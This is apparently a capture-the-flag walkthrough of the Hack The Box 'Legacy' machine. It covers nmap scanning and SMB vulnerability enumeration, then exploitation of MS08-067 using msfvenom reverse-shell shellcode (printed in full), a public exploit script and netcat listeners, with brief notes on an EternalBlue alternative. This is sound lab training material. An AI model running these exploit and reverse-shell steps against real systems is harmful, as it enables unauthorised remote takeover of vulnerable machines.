---
sidebar_position: 1
---

# Legacy

## Reconnaissance

Create a directory to collect the scan results `nmap`:

Run a quick initial nmap scan to see which ports are open and which services are running on those ports.

<pre>
nmap -sC -sV -O -oA nmap/initial 10.10.10.4
</pre>

- <b>-sC</b>: run default nmap scripts
- <b>-sV</b>: detect service version
- <b>-O</b>: detect OS
- <b>-oA</b>: output all formats and store in the nmap/initial file

```
┌──(root㉿kali)-[/home/kali/workshop]
└─# nmap -sC -sV -O -oA nmap/initial 10.10.10.4
# Nmap 7.92 scan initiated Sat Nov 19 15:41:04 2022 as: nmap -sC -sV -O -oA nmap/initial 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up (0.32s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/19%OT=135%CT=1%CU=37797%PV=Y%DS=2%DC=I%G=Y%TM=63793
OS:F85%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%T
OS:S=0)OPS(O1=M537NW0NNT00NNS%O2=M537NW0NNT00NNS%O3=M537NW0NNT00%O4=M537NW0
OS:NNT00NNS%O5=M537NW0NNT00NNS%O6=M537NNT00NNS)WIN(W1=FAF0%W2=FAF0%W3=FAF0%
OS:W4=FAF0%W5=FAF0%W6=FAF0)ECN(R=Y%DF=Y%T=80%W=FAF0%O=M537NW0NNS%CC=N%Q=)T1
OS:(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=N%T=80%W=0%S=Z%A=S%F=AR%O
OS:=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=FAF0%S=O%A=S+%F=AS%O=M537NW0NNT00NNS%RD=0%Q
OS:=)T4(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=80%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=N%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=B0%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h57m40s, deviation: 1h24m50s, median: 4d23h57m40s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:bb:5a (VMware)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-11-25T00:39:11+02:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 19 15:41:41 2022 -- 1 IP address (1 host up) scanned in 37.41 seconds
```

I got 3 open ports:

- <b>135</b>: RPC (Remote Policy Calls) client server communication
- <b>139</b>: Server Message Block (SMB) protocol
- <b>445</b>: SMB protocol over TCP/IP and for the Microsoft Directory Services for Active Directory (AD)

Three files containing the complete scan results have been created in `nmap` directory: `initial.gnmap`, `initial.nmap`, and `initial.xml`.

## Enumeration

Enumerate the SMB ports:

<pre>
nmap -sV --script smb-vuln* -p 139,445 10.10.10.4 -oA nmap/enum
</pre>

`smb-vuln` is a group of <b>nmap scripts</b>.

<pre>
ls /usr/share/nmap/scripts | grep smb-vuln
</pre>

```
┌──(root㉿kali)-[/home/kali/workshop]
└─# nmap -sV --script smb-vuln\* -p 139,445 10.10.10.4 -oA nmap/enum
# Nmap 7.92 scan initiated Sun Nov 20 05:46:32 2022 as: nmap -sV --script smb-vuln* -p 139,445 -oA nmap/enum 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up (0.17s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 20 05:46:50 2022 -- 1 IP address (1 host up) scanned in 17.79 seconds
```

Under <b>Host script results</b>, `smb-vuln-ms17-010` and `smb-vuln-ms08-067` vulnerabilities can be seen.

## Exploitation

Google search:

<pre>
ms08-067 exploit github
</pre>

Follow this link:

<pre>
https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
</pre>

Save the python file in Kali Linux.

Follow the instructions found in the file:

```
# ------------------------------------------------------------------------
# REPLACE THIS SHELLCODE with shellcode generated for your use
# Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS.
#
# Example msfvenom commands to generate shellcode:
# msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

# Reverse TCP to 192.168.119.204 port 62000:
shellcode=(
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xae\xc3\xb5\x92\x83\xee\xfc\xe2\xf4\x52\x2b\x37\x92\xae\xc3"
...
)
# ------------------------------------------------------------------------
```

I'll use an `unstaged` payload to get a reverse shell using `netcat`. I a staged payload is used instead, the `meterpreter` should be used, which is not allowed in OSCP.

First, generate the shellcode:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=5678 EXITFUNC=thread -v shellcode -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

<!-- ```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=4545 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -v shellcode -f py -a x86 --platform windows
``` -->

- <b>-f</b>: file type
- <b>-a</b>: architecture

_LHOST=10.10.16.3 was found out after running `ifconfig` by reading the value `inet` of `tun0`_.

```
┌──(root㉿kali)-[/home/kali/workshop/legacy]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=5678 EXITFUNC=thread -v shellcode -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1497 bytes
unsigned char shellcode[] =
"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x97\x27\xe5\xb3\x83\xee\xfc\xe2\xf4\x6b\xcf\x67\xb3"
"\x97\x27\x85\x3a\x72\x16\x25\xd7\x1c\x77\xd5\x38\xc5\x2b"
"\x6e\xe1\x83\xac\x97\x9b\x98\x90\xaf\x95\xa6\xd8\x49\x8f"
"\xf6\x5b\xe7\x9f\xb7\xe6\x2a\xbe\x96\xe0\x07\x41\xc5\x70"
"\x6e\xe1\x87\xac\xaf\x8f\x1c\x6b\xf4\xcb\x74\x6f\xe4\x62"
"\xc6\xac\xbc\x93\x96\xf4\x6e\xfa\x8f\xc4\xdf\xfa\x1c\x13"
"\x6e\xb2\x41\x16\x1a\x1f\x56\xe8\xe8\xb2\x50\x1f\x05\xc6"
"\x61\x24\x98\x4b\xac\x5a\xc1\xc6\x73\x7f\x6e\xeb\xb3\x26"
"\x36\xd5\x1c\x2b\xae\x38\xcf\x3b\xe4\x60\x1c\x23\x6e\xb2"
"\x47\xae\xa1\x97\xb3\x7c\xbe\xd2\xce\x7d\xb4\x4c\x77\x78"
"\xba\xe9\x1c\x35\x0e\x3e\xca\x4f\xd6\x81\x97\x27\x8d\xc4"
"\xe4\x15\xba\xe7\xff\x6b\x92\x95\x90\xd8\x30\x0b\x07\x26"
"\xe5\xb3\xbe\xe3\xb1\xe3\xff\x0e\x65\xd8\x97\xd8\x30\xe3"
"\xc7\x77\xb5\xf3\xc7\x67\xb5\xdb\x7d\x28\x3a\x53\x68\xf2"
"\x72\xd9\x92\x4f\xef\xb9\x87\x24\x8d\xb1\x97\x31\xcb\x3a"
"\x71\x4d\xf5\xe5\xc0\x4f\x7c\x16\xe3\x46\x1a\x66\x12\xe7"
"\x91\xbf\x68\x69\xed\xc6\x7b\x4f\x15\x06\x35\x71\x1a\x66"
"\xff\x44\x88\xd7\x97\xae\x06\xe4\xc0\x70\xd4\x45\xfd\x35"
"\xbc\xe5\x75\xda\x83\x74\xd3\x03\xd9\xb2\x96\xaa\xa1\x97"
"\x87\xe1\xe5\xf7\xc3\x77\xb3\xe5\xc1\x61\xb3\xfd\xc1\x71"
"\xb6\xe5\xff\x5e\x29\x8c\x11\xd8\x30\x3a\x77\x69\xb3\xf5"
"\x68\x17\x8d\xbb\x10\x3a\x85\x4c\x42\x9c\x05\xae\xbd\x2d"
"\x8d\x15\x02\x9a\x78\x4c\x42\x1b\xe3\xcf\x9d\xa7\x1e\x53"
"\xe2\x22\x5e\xf4\x84\x55\x8a\xd9\x97\x74\x1a\x66";
```

In the `ms08-067.py` file replace the value of the `shellcode` variable with the one generated above.

Execute the `ms08-067.py` file:

<pre>
python ms08-067.py
</pre>

```
┌──(root㉿kali)-[/home/kali/workshop/legacy]
└─# python ms08-067.py
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer
#   - Added support for selecting a target port at the command line.
#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode.
#######################################################################


$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .


#######################################################################


Usage: ms08-067.py <target ip> <os #> <Port #>

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)

FYI: nmap has a good OS discovery script that pairs well with this exploit:
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1
```

Open another termnal and run the following:

<pre>
nc -lnvp 5678
</pre>

In the original terminal, run the python script using option 6 from above:

<pre>
python ms08-067.py 10.10.10.4 6 445
</pre>

---

Clone the exploit code from GitHub:

```md
git clone https://github.com/helviojunior/MS17-010.git
```

Use MSFvenom to create a reverse shell payload:

```md
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe > eternalblue.exe
```

---

<pre>
searchsploit ms08-067
</pre>

<pre>
locate 40279.py
</pre>

<pre>
cp /usr/share/exploitdb/exploits/windows/remote/40279.py 40279.py
</pre>

<pre>
gedit 40279.py
</pre>

<pre>
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=4444  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -v shellcode -f python -s 410 -n 30
</pre>

- <b>-s</b>: total size in bytes (payload: 380 bytes, nopfleps: 30 bytes)
- <b>-n</b>: size of nopfleps

Replace the payload

In 40279.py before `current = SRVSVC_Exploit(target, os)` add `print(len(shellcode))`

<pre>
nc -nlvp 4444
</pre>

Execute the script with option 6

<pre>
python 40279.py 10.10.10.4 6
</pre>
